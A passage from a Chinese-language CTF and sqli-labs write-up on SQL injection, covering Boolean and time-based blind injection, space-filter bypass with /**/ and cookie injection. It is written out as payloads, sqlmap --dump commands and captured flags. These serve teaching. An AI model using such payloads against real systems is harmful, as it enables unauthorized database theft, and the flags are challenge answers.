专门用来存储所有的列</span><br></pre></td></tr></table></figure><br>\n<strong> 猜解某个列长度</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select length(column_name) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=长度</span><br></pre></td></tr></table></figure><br>\n<strong> 逐位猜解列名</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select ascii(substr(column_name,位数，1)) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=ascii码</span><br></pre></td></tr></table></figure><br>\n<strong> 判断数据的数量</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select count(列名) from 表名)=数量</span><br></pre></td></tr></table></figure><br>\n<strong> 猜解某条数据的长度</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select length(列名) from 表名 limit n,1)=长度</span><br></pre></td></tr></table></figure><br>\n<strong> 逐位猜解数据</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select ascii(substr(user,位数,1)) from 表名 limit n,1)=ascii码</span><br></pre></td></tr></table></figure><br>\n<strong> 绕过技巧</strong><br>\n<strong> (1) substr 函数绕过</strong><br>\n left (str, 从左边开始截取的位置)<br>\n right (str, 从右边开始截取的位置)<br>\n substring (str, 从左边开始截取的位置)<br>\n mid (str,index,key) 截取 str 从 index 开始，截取 len 的长度<br>\n lpad (str,len,padstr) rpad (str,len,padstr) 在 str 的左 (右) 两边填充给定的 padstr 到指定的长度 len，返回填充的结果<br>\n<strong> (2) 等于号 (=) 绕过</strong><br>\n 1. 用 in ()<br>\n 2. 用 like<br>\n<strong> (3) ASCII () 绕过</strong><br>\n hex () bin () ord ()</p>\n<p><strong>SQL-labs-----------8</strong><br>\n<strong>1. 使用当引号 (’) 判断，发现返回的结果由正确的回显变成错误的</strong><br>\n<img data-src=\"https://img-blog.csdnimg.cn/dc11ea754b26459bb32c48c3d4b9cae8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n访问 id=1' and 1=1%23,id=1' and 1=2%23, 发现返回的结果分别是有回显和没有回显。就算是改变 id 的值，本题中只有两种回显，一个正确和一个错误，而没有返回数据库中的数据，所以此处不可使用 union 注入。此处尝试利用 Boolean 注入，Boolean 注入是指构建 SQL 判断语句，通过查看页面的返回结果来推测哪些 SQL 判断条件是成立的，以此获取数据库中的数据。<br>\n<strong>2. 判断数据库的长度</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; and length(database())&gt;=1--+</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/74fef2876dce4f3281090f011368b63b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 有单引号，所以需要注释符来注释。1 的位置上可以是任意数字，如 ' and length (database ())&gt;=8--+ 和 ' and length (database ())&gt;=9--+, 我们可以构造这样的语句，然后观察页面的返回结果。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/a6c71030c5c846858a3ebba490e4c555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<img data-src=\"https://img-blog.csdnimg.cn/96cad9768ea0499b95a6ec4e308284d4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n然后可以发现当数值为 8 时，返回的结果是正确的，当数值为 9 时，返回的结果是错误的，整个语句的意思是，数据库库名的长度大于等于 8，回显为真，数据库库名的长度大于等于 9，回显为假，由此判断出数据库的长度为 8.<br>\n<strong>3. 判断数据库的名称</strong><br>\n数据库库名的范围一般在 a<sub>z、0</sub>9 之内，可能还有一些特殊的字符。逐字符判断的 SQL 语句为:<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure><br>\nlimit 和 substr 的区别，limit 是从 0 开始排序，而 substr 是从 1 开始排序。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/d24e5aff99c444faa17512ee3989d26d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n原理就是这样依次往后的测试<br>\n<strong> (2) ASCII 码判读数据库的名称</strong><br>\n在 MySQL 中 ASCII 转换的函数为 ord，则逐字符判断的 SQL 语句为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and ord(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/123613c2242348668fb4d890f29b683c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>4. 知道库名，判断表名</strong><br>\n查询表名，字段名的语句也应该放在 database () 的位置，经过前面的测试，我们知道数据库的名称为:security 爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/29571163c3f0455ba7918ed3ca7aa155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 以此类推，就可以查询出所有的表名与字段名。<br>\n<strong>方法二：直接上手 SQlmap</strong><br>\n1. 爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-7178e886e9f36bb5.sandbox.ctfhub.com:10800/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/16f8ec71f7bf4a55a24977839a933ca3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 爆表，因为前面三个是系统库，直接使用 sqli 这个数据库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-7178e886e9f36bb5.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli --tables</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/f10733f54b9b49b0842ba820a5a11112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n3. 因为我们最后得到的是 flag，所以选择 flag 这个库，接下来直接爆字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-7178e886e9f36bb5.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli -T flag columns --dump</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a1d94cf6dd084d3399c6c11d759f1d32.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;94d535de0272d3dd1d398bb3&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2时间盲注\"><a class=\"anchor\" href=\"#2时间盲注\">#</a> (2) 时间盲注</h4>\n<p>时间盲注与 Boolean 注入的不同之处在于，时间注入是利用 sleep () 或 benchmark () 等函数让 MYSQL 的执行时间变长。时间盲注多与 IF (expr1,expr2,expr3) 结合使用，此 if 语句含义是：如果 expr1 是 TRUE，则 if () 的返回值为 expr2; 否则返回值则为 expr3。所以判断数据库库名长度的语句为:<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure><br>\n 上述语句的意思是，如果数据库库名的长度大于 1，则 MySQL 查询休眠 5 秒，否则查询 1。<br>\n就以 sql-labs 第九关为例<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.1.30:83/sqli-labs-master/Less-9/?id=1</span><br></pre></td></tr></table></figure><br>\n 如下图所示，而查询 1 的结果，大约只有几十毫秒，根据 BurpSuite 中页面的时间，可以判断条件是否正确<br>\n<img data-src=\"https://img-blog.csdnimg.cn/f860267aa3d842cbbb06ec31fd8886b1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;+and+if(length(database())&gt;7,sleep(5),1)--+</span><br></pre></td></tr></table></figure><br>\n 如下图所示，页面响应的时间是 7042 毫秒，也就是 7.042 秒，表明页面成功执行了 sleep (5), 所以长度是大于 7 的。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/d1e30359c7a04dd99b29b7ed89951cc1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n我们尝试将判断数据库库名长度语句中的长度改为 8。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;+and+if(length(database())&gt;=8,sleep(5),1)--+</span><br></pre></td></tr></table></figure><br>\n 回显的时间明显延长，说明数据库的长度大于等于 8<br>\n<img data-src=\"https://img-blog.csdnimg.cn/06f0d6bcb27c443dbd2b1c41125b111f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 改成 9 试试，时间明显缩短，更加确切的说明数据库的长度为 8.<br>\n<img data-src=\"https://img-blog.csdnimg.cn/49f78c1227814742a51621e767c5f932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得出数据库的长度后，我们开始查询数据库名的第一位字母。查询语句跟 Boolean 盲注的类似，使用 substr 函数，这是的语句应该改为：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;+and+if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/710a1c679b4a431b8e2ea762e58c3a8a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 可以看出，程序延迟了 7.271 秒才返回，说明数据库库名的第一个字母是 s, 以此类推即可得出完整的数据库名、表名、字段名和具体的数据。</p>\n<p>尝试一波 sqlmap<br>\n<img data-src=\"https://img-blog.csdnimg.cn/54189db309ff4632ad2c649d6242eb21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n1. 爆破数据库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-317cd0f12af09335.sandbox.ctfhub.com:10800/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/44e3976604b94afca89665e8c76916d6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 使用 sqli 数据库，进行爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-317cd0f12af09335.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli --tables</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/1517f2e4ebfb426990156499b89c8e02.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n3. 使用 flag 表，进行爆字段及内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-317cd0f12af09335.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli -T flag columns --dump</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/3b798b58c8a04c7fa5028b3edfae2186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 最终得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;ad6cccf5310f3b85e4c6680c&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"5mysql结构\"><a class=\"anchor\" href=\"#5mysql结构\">#</a> 5.MYSQL 结构</h3>\n<p>直接上手，sqlmap<br>\n1. 爆库走起<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-a8766344f3dee361.sandbox.ctfhub.com:10800/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/8159fb4dd5f34f0d92196b6777eeefc9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 使用 sqli 库，爆表开始<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-a8766344f3dee361.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli --tables</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e8c6f147e58a4bf0b7b9f38d3a50ca81.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n3. 爆字段及内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://challenge-a8766344f3dee361.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli -T whvvzxswne columns --dump</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e24658abc8474559b24892fd08144f1e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;4a3f6bdc765b550687f7da22&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"6过滤空格\"><a class=\"anchor\" href=\"#6过滤空格\">#</a> 6. 过滤空格</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/77fa405836f849d6b6f6fb5489d03fae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n测试了一下，空格绕过的话，sqlmap 直接跑不出来<br>\n 1. 测试 or,and 等特殊字符是否被过滤<br>\n使用 /**/ 绕过空格<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://challenge-bf09b84c446b8972.sandbox.ctfhub.com:10800/?id=1/**/or/**/1=1</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a0957339133a42c6ba069659b5ac6061.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<img data-src=\"https://img-blog.csdnimg.cn/afe79b55cd23483c85a748f9cfc0dba3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n1. 判断列名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1/**/order/**/by/**/1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/ead9b006d3c24bac87ae3f3fcf57b327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 那直接使用 union select 注入，判断其显位点<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://challenge-bf09b84c446b8972.sandbox.ctfhub.com:10800/?id=1/**/and/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e559ce4fd51f4c11a426db37d1e14b4f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 进过测试，前端没有回显，只能使用 BurpSuit 查看后端的回显<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1/**/union/**/select/**/1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c952816d63034a80be4a637f9d1f191f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n1. 爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1/**/union/**/select/**/1,database()</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/29f957b97505437dbdf3a31b014ae395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 知道数据库库名为:sqli，爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1/**/union/**/select/**/1,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;/**/limit/**/0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/09ec56e10687426492d450c4120e2907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到第一张表，表名为：news; 继续爆第二张表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1/**/union/**/select/**/1,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;/**/limit/**/1,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/2572eb1efff242439c383e7bc039134e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到第二张表，表名为:wcdxjvlrqg</p>\n<p>3. 爆 wcdxjvlrqg 中的字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1/**/union/**/select/**/1,(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=&#x27;sqli&#x27;/**/and/**/table_name=&#x27;wcdxjvlrqg&#x27;/**/limit/**/0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a8a02942b48145f689455750887f15be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 试试看还有没有第二个字段名<br>\n<img data-src=\"https://img-blog.csdnimg.cn/b93a903cc39945c48e3f092f6f3164a7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 4. 爆破字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1/**/union/**/select/**/1,(select/**/ovuqyyofsh/**/from/**/wcdxjvlrqg/**/limit/**/0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/690d563dd4b543b08371a0b8493bd315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;4871de51d56093a832496d11&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"7cookie注入\"><a class=\"anchor\" href=\"#7cookie注入\">#</a> 7.cookie 注入</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/f31ef0783deb42fe97e53107785fd9d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n根据提示 cookie 注入，直接抓包上手<br>\n<strong>方法一：手工注入</strong><br>\n 1. 判断列名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: id=1 order by 1,2;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/52c80d59f39a4652946b036fc95ea308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n2. 使用 union select 判断其注入点<br>\n<img data-src=\"https://img-blog.csdnimg.cn/5cb09089676649ae95f276532e7757ed.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 3. 知道注入点在 2 上，爆库开始<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: id=-1 union select 1,database();</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/8f7b6da430e640dea2f9aaf0f3e6acc5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 得到数据库库名为 sqli, 爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: id=-1 union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1);</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c4cf5820d4f94628914a5813405d6875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n5. 表名为 pmztnmplmx，爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: id=-1 union select 1,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;nlcalxydrn&#x27; limit 0,1);</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/68a175af6fbd404c80ec79e8f16d0a9f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n6. 知道字段名为 bthklxaibf，爆字段的内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: id=-1 union select 1,(select bthklxaibf from pmztnmplmx limit 0,1);</span><br></pre></td></tr></table></figure><br>\n<img 